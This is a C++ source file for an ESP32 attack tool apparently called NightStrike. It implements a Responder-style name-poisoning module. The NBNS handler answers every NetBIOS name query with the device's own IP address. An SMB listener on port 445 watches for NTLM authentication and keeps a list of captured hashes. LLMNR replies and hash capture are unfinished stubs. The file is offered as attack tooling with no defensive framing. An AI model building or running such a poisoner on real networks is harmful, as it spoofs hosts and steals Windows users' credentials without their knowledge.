#include "modules/wifi_module.h"
#include <WiFi.h>
#include <Arduino.h>
#include <vector>
#include <string>
#include <cstring>
#include <cctype>

namespace NightStrike {
namespace Modules {

// Responder state
static bool g_responderActive = false;
static std::string g_netbiosName = "NIGHTSTRIKE";
static WiFiUDP* g_nbnsUDP = nullptr;
static WiFiUDP* g_llmnrUDP = nullptr;
static WiFiServer* g_smbServer = nullptr;
static std::vector<std::string> g_capturedHashes;

// Ports
const uint16_t NBNS_PORT = 137;
const uint16_t LLMNR_PORT = 5355;
const uint16_t SMB_PORT = 445;

// Encode NetBIOS name
static void encodeNetBIOSName(const char* name, uint8_t out[32]) {
    char namePad[16];
    memset(namePad, ' ', 15);
    namePad[15] = 0x20;  // Server service type
    
    size_t n = strlen(name);
    if (n > 15) n = 15;
    for (size_t i = 0; i < n; ++i) {
        namePad[i] = toupper(name[i]);
    }
    
    for (int i = 0; i < 16; ++i) {
        uint8_t c = (uint8_t)namePad[i];
        uint8_t highNibble = (c >> 4) & 0x0F;
        uint8_t lowNibble = c & 0x0F;
        out[2 * i] = 0x41 + highNibble;
        out[2 * i + 1] = 0x41 + lowNibble;
    }
}

// Process NBNS packet
static void processNBNS(WiFiUDP& udp) {
    uint8_t buffer[512];
    int packetSize = udp.parsePacket();
    
    if (packetSize > 0) {
        int len = udp.read(buffer, sizeof(buffer));
        
        // Check if it's a name query
        if (len >= 12 && (buffer[2] & 0x80) == 0) {  // Query (not response)
            // Send NBNS response
            IPAddress remoteIP = udp.remoteIP();
            uint16_t remotePort = udp.remotePort();
            
            // Build NBNS response
            uint8_t response[60];  // Increased size for IP address
            response[0] = buffer[0];  // Transaction ID
            response[1] = buffer[1];
            response[2] = 0x85;  // Response, Authoritative
            response[3] = 0x00;
            response[4] = 0x00;  // Questions
            response[5] = 0x00;
            response[6] = 0x00;  // Answer RRs
            response[7] = 0x01;
            response[8] = 0x00;  // Authority RRs
            response[9] = 0x00;
            response[10] = 0x00;  // Additional RRs
            response[11] = 0x00;
            
            // Name (encoded)
            uint8_t encodedName[32];
            encodeNetBIOSName(g_netbiosName.c_str(), encodedName);
            memcpy(response + 12, encodedName, 32);
            
            // Type (0x0020 = NB)
            response[44] = 0x00;
            response[45] = 0x20;
            
            // Class (0x0001 = IN)
            response[46] = 0x00;
            response[47] = 0x01;
            
            // TTL
            response[48] = 0x00;
            response[49] = 0x00;
            response[50] = 0x00;
            response[51] = 0x78;  // 120 seconds
            
            // Data length
            response[52] = 0x00;
            response[53] = 0x06;
            
            // Flags
            response[54] = 0x00;
            response[55] = 0x00;
            
            // IP address
            IPAddress localIP = WiFi.localIP();
            response[56] = localIP[0];
            response[57] = localIP[1];
            response[58] = localIP[2];
            response[59] = localIP[3];
            
            udp.beginPacket(remoteIP, remotePort);
            udp.write(response, 60);
            udp.endPacket();
            
            Serial.printf("[Responder] NBNS response sent to %s\n", remoteIP.toString().c_str());
        }
    }
}

// Process LLMNR packet
static void processLLMNR(WiFiUDP& udp) {
    uint8_t buffer[512];
    int packetSize = udp.parsePacket();
    
    if (packetSize > 0) {
        int len = udp.read(buffer, sizeof(buffer));
        
        // LLMNR uses similar format to DNS
        // TODO: Implement LLMNR response
        Serial.println("[Responder] LLMNR query received");
    }
}

// Process SMB connection
static void processSMB(WiFiServer& server) {
    WiFiClient client = server.available();
    if (client && client.connected()) {
        Serial.println("[Responder] SMB client connected");
        
        // TODO: Implement SMB server
        // This involves:
        // 1. Negotiate SMB protocol
        // 2. Handle NTLM authentication
        // 3. Capture NTLM hashes
        
        while (client.connected() && client.available()) {
            uint8_t buffer[1024];
            int len = client.read(buffer, sizeof(buffer));
            
            // Check for NTLM authentication
            if (len > 8 && memcmp(buffer, "NTLMSSP", 8) == 0) {
                Serial.println("[Responder] NTLM authentication detected");
                // TODO: Process NTLM and capture hash
            }
        }
        
        client.stop();
    }
}

Core::Error WiFiModule::startResponder(const std::string& netbiosName) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    if (WiFi.status() != WL_CONNECTED && !isAPActive()) {
        return Core::Error(Core::ErrorCode::NETWORK_NOT_CONNECTED);
    }

    if (g_responderActive) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }

    g_netbiosName = netbiosName;
    g_capturedHashes.clear();

    // Start NBNS listener
    if (!g_nbnsUDP) {
        g_nbnsUDP = new WiFiUDP();
    }
    g_nbnsUDP->begin(NBNS_PORT);

    // Start LLMNR listener
    if (!g_llmnrUDP) {
        g_llmnrUDP = new WiFiUDP();
    }
    g_llmnrUDP->begin(LLMNR_PORT);

    // Start SMB server
    if (!g_smbServer) {
        g_smbServer = new WiFiServer(SMB_PORT);
    }
    g_smbServer->begin();

    g_responderActive = true;
    Serial.printf("[Responder] Started (NetBIOS: %s)\n", netbiosName.c_str());
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::stopResponder() {
    if (!g_responderActive) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }

    if (g_nbnsUDP) {
        g_nbnsUDP->stop();
        delete g_nbnsUDP;
        g_nbnsUDP = nullptr;
    }

    if (g_llmnrUDP) {
        g_llmnrUDP->stop();
        delete g_llmnrUDP;
        g_llmnrUDP = nullptr;
    }

    if (g_smbServer) {
        g_smbServer->stop();
        delete g_smbServer;
        g_smbServer = nullptr;
    }

    g_responderActive = false;
    Serial.println("[Responder] Stopped");
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::getCapturedHashes(std::vector<std::string>& hashes) {
    hashes = g_capturedHashes;
    return Core::Error(Core::ErrorCode::SUCCESS);
}

// Helper function to process Responder (should be called in loop)
void processResponder() {
    if (!g_responderActive) return;
    
    if (g_nbnsUDP) {
        processNBNS(*g_nbnsUDP);
    }
    
    if (g_llmnrUDP) {
        processLLMNR(*g_llmnrUDP);
    }
    
    if (g_smbServer) {
        processSMB(*g_smbServer);
    }
}

} // namespace Modules
} // namespace NightStrike

